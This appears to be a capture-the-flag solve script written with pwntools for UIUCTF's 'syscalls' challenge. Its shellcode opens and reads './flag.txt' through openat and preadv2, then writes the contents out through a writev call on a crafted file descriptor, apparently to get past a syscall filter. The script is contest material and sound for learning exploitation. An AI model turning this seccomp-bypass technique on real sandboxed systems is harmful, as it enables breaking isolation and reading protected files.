from pwn import *
import sys

_path = "./syscalls"
exe = ELF(_path)
#libc = ELF("./libc.so.6")
#ld = ELF("./ld-linux-x86-64.so.2")
add = 'syscalls.chal.uiuc.tf'
port = 1337
cmd = '''
'''

_option = {'run' : process(_path), 
           'exp' : remote(add, port, ssl = True)}

def conn():
    if(len(sys.argv) == 1):
        return gdb.debug(_path, cmd)
    else:
        return _option[sys.argv[1]]

chall = conn()

context.log_level = 'debug'

def p(_data):
    return u64(_data, endian = 'little')

def _send(payload):
    chall.sendlineafter(b'I can give you.', payload)

def main():
    payload = asm('''
                  mov rax, 0x101
                  xor rdi, rdi
                  mov rdi, -100
                  mov rsi, 0x7478
                  push rsi
                  mov rsi, 0x742e67616c662f2e
                  push rsi
                  lea rsi, [rsp]
                  xor rdx, rdx
                  syscall
                  add rsp, 0x1337
                  mov rax, 0x147
                  mov rdi, 0x3
                  mov rcx, 0x50
                  push rcx
                  lea rcx, [rsp]
                  add rcx, 0x8
                  push rcx
                  nop
                  nop
                  nop
                  nop
                  nop
                  nop
                  nop
                  nop
                  nop
                  nop
                  nop
                  nop
                  lea rcx, [rsp]
                  nop
                  nop
                  nop
                  nop
                  nop
                  nop
                  nop
                  nop
                  mov rsi, rcx
                  mov rdx, 1
                  xor rcx, rcx
                  xor r10, r10
                  xor r8, r8
                  xor r9, r9
                  syscall
                  mov rax, 0x14
                  mov rdi, 0x100000001
                  syscall
                  ''', arch = 'amd64', os = 'linux')
    print(len(payload))
    _send(payload)
    chall.interactive()

if __name__ == "__main__":
    main()
